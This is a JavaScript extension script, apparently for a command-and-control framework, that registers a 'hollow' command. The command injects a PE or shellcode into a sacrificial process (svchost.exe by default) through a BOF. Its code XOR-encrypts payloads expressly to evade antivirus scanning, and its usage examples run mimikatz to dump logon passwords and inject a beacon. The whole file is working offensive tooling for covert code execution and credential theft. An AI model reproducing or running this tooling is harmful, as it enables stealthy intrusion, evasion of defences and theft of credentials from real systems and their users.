var cmd_hollow = ax.create_command(
    "hollow",
    "Process hollowing (PE/shellcode) into a sacrificial process.\n" +
    "  PE mode:     NtUnmapViewOfSection + write PE + relocations. Loader handles imports.\n" +
    "  SC mode:     VirtualAllocEx + thread hijack.\n" +
    "  Payload is XOR-encrypted operator-side to avoid AV scanning beacon memory.\n" +
    "  Output captured via pipes. Fire-and-forget with -no.",
    'hollow --pe /opt/mimikatz.exe -a "privilege::debug sekurlsa::logonpasswords"\n' +
    'hollow --sc /opt/beacon.bin -no\n' +
    'hollow --local-pe C:\\Windows\\Temp\\tool.exe -a "/all"'
);

cmd_hollow.addArgFlagFile("--pe",       "PE_FILE",     false, "Native PE from operator");
cmd_hollow.addArgFlagFile("--sc",       "SC_FILE",     false, "Shellcode from operator");
cmd_hollow.addArgFlagString("--local-pe",  "WIN_PATH", false, "Native PE on target (local path or UNC)");
cmd_hollow.addArgFlagString("--local-sc",  "WIN_SC",   false, "Shellcode on target (local path)");
cmd_hollow.addArgFlagString("-a",          "ARGS",      false, "Arguments passed to the PE");
cmd_hollow.addArgFlagString("--spawnto",   "SPAWN_TO",  false, "Sacrificial process (default: svchost.exe)");
cmd_hollow.addArgFlagInt("--timeout",      "SECONDS",   false, "Output capture timeout in seconds (default: 60)");
cmd_hollow.addArgBool("-no",                                    "Fire and forget — no output capture");
cmd_hollow.addArgBool("--async",                                "Run BOF asynchronously (returns immediately)");

cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.is64(id) == false) { throw new Error("Only x64 targets supported"); }

    let hasPE       = "PE_FILE" in parsed_json;
    let hasSC       = "SC_FILE" in parsed_json;
    let hasLocalPE  = "WIN_PATH" in parsed_json;
    let hasLocalSC  = "WIN_SC" in parsed_json;

    let inputCount = (hasPE ? 1 : 0) + (hasSC ? 1 : 0) + (hasLocalPE ? 1 : 0) + (hasLocalSC ? 1 : 0);
    if (inputCount === 0) throw new Error("Provide one of: --pe, --sc, --local-pe, --local-sc");
    if (inputCount > 1)   throw new Error("Only one input source allowed");

    let mode = 0;       // 0=PE, 1=shellcode
    let source = 0;     // 0=bytes from operator, 1=path on target
    let payloadBytes = "";
    let localPath = "";
    let xorKey = 0;     // 0 = no encryption (local files)

    if (hasPE || hasSC) {
        if (hasPE) {
            mode = 0; source = 0;
            payloadBytes = parsed_json["PE_FILE"];
        } else {
            mode = 1; source = 0;
            payloadBytes = parsed_json["SC_FILE"];
        }
        if (payloadBytes.byteLength == 0) throw new Error("File is empty or unreadable");

        // XOR encrypt payload to prevent AV signature scanning of beacon memory.
        // Try Uint8Array first, fall back to no encryption if JS engine lacks it.
        try {
            xorKey = Math.floor(Math.random() * 254) + 1;
            let src = new Uint8Array(payloadBytes);
            let enc = new Uint8Array(src.length);
            for (let i = 0; i < src.length; i++) enc[i] = src[i] ^ xorKey;
            payloadBytes = enc.buffer;
        } catch(e) {
            xorKey = 0; // fallback: no encryption
        }

    } else if (hasLocalPE) {
        mode = 0; source = 1;
        localPath = parsed_json["WIN_PATH"];
    } else if (hasLocalSC) {
        mode = 1; source = 1;
        localPath = parsed_json["WIN_SC"];
    }

    let noOutput = parsed_json["-no"] ? 1 : 0;
    let timeout  = ("SECONDS" in parsed_json) ? parsed_json["SECONDS"] * 1000 : 60000;
    let spawnto  = ("SPAWN_TO" in parsed_json) ? parsed_json["SPAWN_TO"] : "";
    let args     = ("ARGS" in parsed_json) ? parsed_json["ARGS"] : "";
    let async    = parsed_json["--async"] ? "-a " : "";

    // Pack: mode, source, noOutput, timeout, xorKey, unused, spawnto, args, localPath, bytes
    let bof_params = ax.bof_pack(
        "int,int,int,int,int,int,cstr,cstr,cstr,bytes",
        [mode, source, noOutput, timeout, xorKey, 0, spawnto, args, localPath, payloadBytes]
    );

    let bof_path = ax.script_dir() + "_bin/hollow." + ax.arch(id) + ".o";

    let label = mode === 0 ? "PE" : "shellcode";
    let srcLabel = source === 0 ? "operator" : "target";
    let message = `Task: ${label} hollow (${srcLabel}) → ${spawnto || "svchost.exe"}`;

    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, message);
});
